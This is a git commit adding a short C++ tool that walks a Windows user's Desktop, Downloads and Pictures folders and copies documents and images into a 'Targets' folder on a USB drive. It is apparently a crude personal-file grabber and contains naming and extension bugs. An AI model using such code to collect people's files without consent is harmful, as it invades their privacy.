0cdcc2cfcfc07eff61d52cb9ac57f42f2ba0ddd0
cMardc <130239955+cMardc@users.noreply.github.com>
2023-05-05 19:48:31 +0400

    Add files via upload

---
+++ File Tool.cpp
@@ -0,0 +1,85 @@
+﻿#include "File Tool.h"//Lib
+using namespace std; //Namespace
+
+int main() //Run On Execute
+{
+    string name;
+    getline(cin, name);
+    vector<string> targets;
+    targets.push_back("C:\\Users\\" + name + "\\Desktop");
+    targets.push_back("C:\\Users\\" + name + "\\Downloads");
+    targets.push_back("C:\\Users\\" + name + "\\Pictures");
+    size_t size = targets.size();
+    string drive; //Drive Path
+    drive = "H:\\"; //Usb Drive
+    fs::create_directory("H:\\Targets"); //Create Directory On Drive
+    drive = "H:\\Targets"; //Folder In Usb Drive
+    for(size_t i = 0; i < size; i++)
+    {
+        for(const auto& target : fs::recursive_directory_iterator(targets[i]))
+        {
+            if(is_regular_file(target))
+            {
+                string path,name,format;
+                path = target.path().generic_string();
+                format = target.path().extension().generic_string();
+                name =  getName(path);
+                cout << "Path : " << path << endl;
+                cout << "Name : " << name << endl;
+                cout << "Format : " << format << endl;
+                try
+                {
+                    if(format != "ERROR")
+                    {
+                        if(format == ".txt" || format == ".doc" || format == ".docx" || format == ".pdf" || format == ".png" || format == ".jpg" || format == ".jpeg")
+                        {
+                            ifstream targetFile(path, ios::binary);
+                            if(targetFile.is_open())
+                            {
+                                ofstream copyFile(drive + "\\" + name + "." + format, ios::binary);
+                                if(copyFile.is_open())
+                                {
+                                    copyFile << targetFile.rdbuf();
+                                }
+                                else
+                                {
+                                    throw -3;
+                                }
+                            }
+                            else
+                            {
+                                throw -2;
+                            }
+                        }
+                    }   
+                    else
+                    {
+                        throw -1;
+                    }
+                }
+
+
+                catch(int ErrorCode)
+                {
+                    cout << "\nAcces Denied - ";
+                    if(ErrorCode == -1)
+                    {
+                        cout << "Format Is Unknown";
+                    }
+                    else if(ErrorCode == -2)
+                    {
+                        cout << "Target File Is Not Available";
+                    }
+                    else if(ErrorCode == -3)
+                    {
+                        cout << "Drive Not Available";
+                    }
+                    cout << "\n\n";
+                }
+                
+              
+            }
+        }
+    }
+    return 0;
+}
---
+++ File Tool.h
@@ -0,0 +1,50 @@
+﻿//Starting Of File Tool Header File : 
+#pragma once
+
+#include <iostream> //For Terminal Input-Output Streaming
+#include <fstream> //For File Streaming
+#include <filesystem> //For File And Folder Management
+#include <string> //For Easy Use Of String
+#include <vector> //For Easy Use Of Dynamic Array
+
+using namespace std; //Use Standart Namespace
+namespace fs = filesystem; //File Management Namespace
+
+
+//Get Name Of File On Given Directory
+string getName(string target)
+{
+    string ans;
+    ifstream file(target);
+    if(file.is_open())
+    {
+        size_t size = target.size();
+        char symbol;
+        size_t lastPos = 0;
+        for(size_t i = 0; i < size; i++)
+        {
+            symbol = target[i];
+            if(symbol == '/' || symbol == '\\')
+            {
+                lastPos = i;
+            }
+        }    
+        for(size_t i = lastPos; i < size; i++)
+        {
+            symbol = target[i];
+            if(symbol != '.')
+            {
+                ans += symbol;
+            }   
+            else
+            {
+                break;
+            }
+        }
+    }
+    else
+    {
+        ans = "ERROR";
+    }
+    return ans;
+}
